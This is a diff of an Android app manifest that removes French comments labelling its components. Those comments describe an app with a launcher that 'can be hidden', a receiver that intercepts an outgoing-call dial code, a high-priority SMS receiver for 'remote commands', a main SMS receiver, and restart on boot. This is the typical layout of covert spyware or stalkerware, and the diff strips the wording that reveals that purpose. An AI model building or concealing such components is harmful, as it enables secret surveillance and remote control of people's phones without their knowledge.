@@ -25,7 +25,6 @@
         android:usesCleartextTraffic="true"
         tools:targetApi="34">
 
-        <!-- ✅ ACTIVITÉ PRINCIPALE → PEUT ÊTRE MASQUÉE -->
         <activity android:name=".MainActivity" android:exported="true"
             android:label="@string/app_name"
             android:icon="@android:drawable/ic_menu_myplaces"
@@ -36,7 +35,6 @@
             </intent-filter>
         </activity>
 
-        <!-- ✅ RECEVEUR POUR INTERCEPTER LE CODE TÉLÉPHONE -->
         <receiver android:name=".DialCodeReceiver" android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
@@ -45,7 +43,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- ✅ RECEVEUR SMS POUR COMMANDES À DISTANCE -->
         <receiver android:name=".SecretCommandReceiver" android:exported="true"
             android:permission="android.permission.BROADCAST_SMS">
             <intent-filter android:priority="998">
@@ -55,7 +52,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- ✅ RECEVEUR SMS PRINCIPAL -->
         <receiver android:name=".SMSReceiver" android:exported="true"
             android:permission="android.permission.BROADCAST_SMS">
             <intent-filter android:priority="997">
@@ -65,7 +61,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- ✅ DÉMARRAGE AU REDÉMARRAGE -->
         <receiver android:name=".BootReceiver" android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
